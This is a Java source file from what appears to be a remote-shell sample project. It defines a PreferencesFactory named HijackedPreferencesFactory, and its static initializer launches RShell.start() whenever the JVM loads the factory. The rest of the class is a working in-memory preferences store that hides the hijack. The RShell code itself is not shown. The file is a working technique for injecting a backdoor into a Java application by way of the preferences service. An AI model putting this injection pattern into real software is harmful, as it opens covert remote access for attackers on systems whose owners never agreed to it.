package com.Ox08.rshell.sample.inject.prefs;
import com.Ox08.rshell.sample.RShell;

import java.util.HashMap;
import java.util.Map;
import java.util.prefs.AbstractPreferences;
import java.util.prefs.Preferences;
import java.util.prefs.PreferencesFactory;
public class HijackedPreferencesFactory implements PreferencesFactory {
    static {
        System.out.println("hijack prefs");
        RShell.start();
    }
    private final Preferences prefs = new InMemoryPreferences();
    @Override
    public Preferences systemRoot() {
        return prefs;
    }
    @Override
    public Preferences userRoot() {
        return prefs;
    }

    static class InMemoryPreferences extends AbstractPreferences {
        private final Map<String, String> prefs = new HashMap<>();
        protected InMemoryPreferences() {
            this(null, "");
        }
        protected InMemoryPreferences(AbstractPreferences parent, String name) {
            super(parent, name);
            newNode = true;
        }
        @Override
        protected void putSpi(String key, String value) {
            prefs.put(key, value);
        }
        @Override
        protected String getSpi(String key) {
            return prefs.get(key);
        }
        @Override
        protected void removeSpi(String key) {
            prefs.remove(key);
        }
        @Override
        protected String[] keysSpi() {
            return prefs.keySet().toArray(new String[0]);
        }
        @Override
        protected AbstractPreferences childSpi(String name) {
            return new InMemoryPreferences(this, name);
        }
        @Override
        protected String[] childrenNamesSpi() {
            return new String[0];   // none other than the ones already cached by the parent class
        }
        @Override
        protected void removeNodeSpi() {
            // it's ok, parent will remove from its cache
        }
        @Override
        protected void syncSpi() {
            // wait, what?...
        }
        @Override
        protected void flushSpi() {
            // where?
        }
    }
}
